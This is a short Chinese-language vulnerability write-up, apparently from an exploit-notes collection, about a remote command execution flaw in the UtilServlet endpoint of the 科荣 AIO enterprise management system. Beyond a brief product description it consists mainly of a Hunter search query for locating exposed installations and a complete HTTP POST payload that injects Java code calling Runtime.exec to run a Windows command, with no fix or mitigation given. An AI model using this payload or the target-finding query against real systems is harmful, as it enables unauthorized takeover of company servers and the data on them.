# 科荣 AIO 管理系统 UtilServlet 存在远程命令执行漏洞

# 一、漏洞简介
科荣AIO企业一体化管理解决方案,通过ERP（进销存财务）、OA（办公自动化）、CRM（客户关系管理）、UDP（自定义平台），集电子商务平台、支付平台、ERP平台、微信平台、移动APP等解决了众多企业客户在管理过程中跨部门、多功能、需求多变等通用及个性化的问题。科荣 AIO 管理系统 UtilServlet 存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 科荣 AIO 管理系统 

# 三、资产测绘
+ hunter`app.name="科荣 AIO"`
+ 特征

![1699631783798-97153184-155c-4762-9c58-b7c8334bc638.png](./img/8C_gc1ZbNQq7MyLJ/1699631783798-97153184-155c-4762-9c58-b7c8334bc638-959475.png)

# 四、漏洞复现
```plain
POST /UtilServlet HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
 
operation=calculate&value=BufferedReader+br+%3d+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec("cmd.exe+/c+whoami").getInputStream()))%3bString+line%3bStringBuilder+b+%3d+new+StringBuilder()%3bwhile+((line+%3d+br.readLine())+!%3d+null)+{b.append(line)%3b}return+new+String(b)%3b&fieldName=example_field
```

![1706534515581-13127fb9-02eb-477c-99f7-de2a3cca7804.png](./img/8C_gc1ZbNQq7MyLJ/1706534515581-13127fb9-02eb-477c-99f7-de2a3cca7804-488011.png)



> 更新: 2024-02-29 23:55:46  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/maxbgi836ngdayg3>